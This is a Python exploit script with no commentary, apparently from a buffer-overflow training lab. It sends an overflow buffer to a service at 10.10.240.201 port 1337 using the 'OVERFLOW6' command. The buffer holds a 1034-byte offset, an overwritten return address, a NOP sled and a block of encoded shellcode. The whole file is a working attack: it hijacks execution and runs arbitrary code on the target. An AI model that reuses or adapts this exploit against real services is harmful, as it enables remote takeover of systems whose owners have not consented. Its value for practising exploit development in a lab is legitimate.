#!/usr/bin/python3

import socket

ip = "10.10.240.201"
port = 1337

prefix = "OVERFLOW6 "
offset = 1034
overflow = "A" * offset
retn = "\xaf\x11\x50\x62"
padding = "\x90" * 16
payload = ("\xbf\x11\xbb\xa1\x94\xda\xdc\xd9\x74\x24\xf4\x5a\x2b\xc9\xb1"
"\x52\x31\x7a\x12\x83\xea\xfc\x03\x6b\xb5\x43\x61\x77\x21\x01"
"\x8a\x87\xb2\x66\x02\x62\x83\xa6\x70\xe7\xb4\x16\xf2\xa5\x38"
"\xdc\x56\x5d\xca\x90\x7e\x52\x7b\x1e\x59\x5d\x7c\x33\x99\xfc"
"\xfe\x4e\xce\xde\x3f\x81\x03\x1f\x07\xfc\xee\x4d\xd0\x8a\x5d"
"\x61\x55\xc6\x5d\x0a\x25\xc6\xe5\xef\xfe\xe9\xc4\xbe\x75\xb0"
"\xc6\x41\x59\xc8\x4e\x59\xbe\xf5\x19\xd2\x74\x81\x9b\x32\x45"
"\x6a\x37\x7b\x69\x99\x49\xbc\x4e\x42\x3c\xb4\xac\xff\x47\x03"
"\xce\xdb\xc2\x97\x68\xaf\x75\x73\x88\x7c\xe3\xf0\x86\xc9\x67"
"\x5e\x8b\xcc\xa4\xd5\xb7\x45\x4b\x39\x3e\x1d\x68\x9d\x1a\xc5"
"\x11\x84\xc6\xa8\x2e\xd6\xa8\x15\x8b\x9d\x45\x41\xa6\xfc\x01"
"\xa6\x8b\xfe\xd1\xa0\x9c\x8d\xe3\x6f\x37\x19\x48\xe7\x91\xde"
"\xaf\xd2\x66\x70\x4e\xdd\x96\x59\x95\x89\xc6\xf1\x3c\xb2\x8c"
"\x01\xc0\x67\x02\x51\x6e\xd8\xe3\x01\xce\x88\x8b\x4b\xc1\xf7"
"\xac\x74\x0b\x90\x47\x8f\xdc\x95\x91\x92\x89\xc2\x9f\xac\xa0"
"\x4e\x29\x4a\xa8\x7e\x7f\xc5\x45\xe6\xda\x9d\xf4\xe7\xf0\xd8"
"\x37\x63\xf7\x1d\xf9\x84\x72\x0d\x6e\x65\xc9\x6f\x39\x7a\xe7"
"\x07\xa5\xe9\x6c\xd7\xa0\x11\x3b\x80\xe5\xe4\x32\x44\x18\x5e"
"\xed\x7a\xe1\x06\xd6\x3e\x3e\xfb\xd9\xbf\xb3\x47\xfe\xaf\x0d"
"\x47\xba\x9b\xc1\x1e\x14\x75\xa4\xc8\xd6\x2f\x7e\xa6\xb0\xa7"
"\x07\x84\x02\xb1\x07\xc1\xf4\x5d\xb9\xbc\x40\x62\x76\x29\x45"
"\x1b\x6a\xc9\xaa\xf6\x2e\xe9\x48\xd2\x5a\x82\xd4\xb7\xe6\xcf"
"\xe6\x62\x24\xf6\x64\x86\xd5\x0d\x74\xe3\xd0\x4a\x32\x18\xa9"
"\xc3\xd7\x1e\x1e\xe3\xfd")
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
